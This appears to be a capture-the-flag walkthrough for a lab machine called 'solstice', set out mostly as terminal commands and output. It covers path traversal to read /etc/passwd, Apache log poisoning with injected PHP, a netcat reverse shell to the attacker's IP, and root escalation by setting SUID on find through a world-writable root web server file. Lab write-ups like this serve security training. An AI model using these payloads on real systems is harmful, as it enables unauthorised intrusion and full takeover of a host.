<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>By executing a simple manual fuzzing, we find a LFI vulnerability in the <code>book</code> parameter, allowing us to few the contents of <strong>/etc/passwd</strong>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../etc/passwd</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin</span><br><span class="line">avahi:x:106:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin</span><br><span class="line">saned:x:107:118::/var/lib/saned:/usr/sbin/nologin</span><br><span class="line">colord:x:108:119:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin</span><br><span class="line">hplip:x:109:7:HPLIP system user,,,:/var/run/hplip:/bin/false</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">sshd:x:110:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:111:120:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">miguel:x:1000:1000:,,,:/home/miguel:/bin/bash</span><br><span class="line">uuidd:x:112:121::/run/uuidd:/usr/sbin/nologin</span><br><span class="line">smmta:x:113:122:Mail Transfer Agent,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">smmsp:x:114:123:Mail Submission Program,,,:/var/lib/sendmail:/usr/sbin/nologin</span><br><span class="line">Debian-exim:x:115:124::/var/spool/exim4:/usr/sbin/nologin</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Web-server-on-port-80"><a href="#Web-server-on-port-80" class="headerlink" title="Web server on port 80"></a><strong>Web server on port 80</strong></h3><p>Now that we have a LFI on the one application, we can attempt to poison the log file of the web application running on port 80. This can be achieved by sending a malicious PHP command to the web application.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php echo &#x27;TEST123&#x27; ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Date: Tue, 11 Aug 2020 21:16:09 GMT</span><br><span class="line">Server: Apache/2.4.38 (Debian)</span><br><span class="line">Content-Length: 301</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=iso-8859-1</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;&lt;head&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;&lt;body&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;</span><br><span class="line">&lt;/p&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;address&gt;Apache/2.4.38 (Debian) Server at 127.0.0.1 Port 80&lt;/address&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use the LFI to verify if the attack worked.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">	&lt;link href=&quot;https://fonts.googleapis.com/css?family=Comic+Sans&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">	&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;style.css&quot;&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;menu&quot;&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php&quot;&gt;Main Page&lt;/a&gt;</span><br><span class="line">	    &lt;a href=&quot;index.php?book=list&quot;&gt;Book List&lt;/a&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">We are still setting up the library! Try later on!&lt;p&gt;192.168.118.9 - - [11/Aug/2020:17:16:09 -0400] &quot;GET TEST123 HTTP/1.1\n&quot; 400 0 &quot;-&quot; &quot;-&quot;</span><br><span class="line">&lt;/p&gt;    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>As we can see, the php code got executed. We can use this to execute commands.</p>
<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a><strong>Exploitation</strong></h2><h3 id="Injecting-the-payload"><a href="#Injecting-the-payload" class="headerlink" title="Injecting the payload"></a><strong>Injecting the payload</strong></h3><p>We can use the log poisoning attack to inject our payload.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ echo &quot;GET &lt;?php system(&#x27;nc -e /bin/bash 192.168.118.9 444&#x27;); ?&gt; HTTP/1.1&quot; | nc 192.168.120.167 80</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Executing-it"><a href="#Executing-it" class="headerlink" title="Executing it"></a><strong>Executing it</strong></h3><p>First, start our listener.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then trigger it with the LFI.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ curl http://192.168.120.167:8593?book=../../../../../var/log/apache2/access.log</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We receive our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali@kali:~$ sudo nc -nvlp 444</span><br><span class="line">listening on [any] 444 ...</span><br><span class="line">connect to [192.168.118.9] from (UNKNOWN) [192.168.120.167] 52810</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line"></span><br><span class="line">python -c &quot;import pty; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">www-data@solstice:/var/tmp/webserver$</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ stty rows 50 cols 250</span><br><span class="line">stty rows 50 cols 250</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Escalation"><a href="#Escalation" class="headerlink" title="Escalation"></a><strong>Escalation</strong></h2><p>Checking the running processes, we can find a local web server running as root.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ps aux</span><br><span class="line">ps aux</span><br><span class="line">USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">...</span><br><span class="line">root       474  0.0  0.0   2388   756 ?        Ss   Aug11   0:00 /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line">root       480  0.0  2.0 196744 21104 ?        S    Aug11   0:01 /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/</span><br><span class="line">...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>If we look into that folder, we can see that the <strong>index.php</strong> file is world-writable.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /var/tmp/sv</span><br><span class="line">ls -l /var/tmp/sv</span><br><span class="line">total 4</span><br><span class="line">-rwxrwxrwx 1 root root 36 Jun 19 00:01 index.php</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>We can use it to execute commands as root. Let’s make <code>find</code> run with the SUID bit.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line">echo &quot;&lt;?php system(&#x27;chmod +s /usr/bin/find&#x27;); ?&gt;&quot; &gt; /var/tmp/sv/index.php</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ curl localhost:57</span><br><span class="line">curl localhost:57</span><br><span class="line"></span><br><span class="line">www-data@solstice:/var/tmp/webserver$ ls -l /usr/bin/find</span><br><span class="line">ls -l /usr/bin/find</span><br><span class="line">-rwsr-sr-x 1 root root 315904 Feb 16  2019 /usr/bin/find</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Then use <code>find</code> to escalate our shell.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www-data@solstice:/var/tmp/webserver$ find . -exec /bin/bash -p \; -quit</span><br><span class="line">find . -exec /bin/bash -p \; -quit</span><br><span class="line">bash-5.0# id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>Walkthrough</tag>
      </tags>
  </entry>
</search>
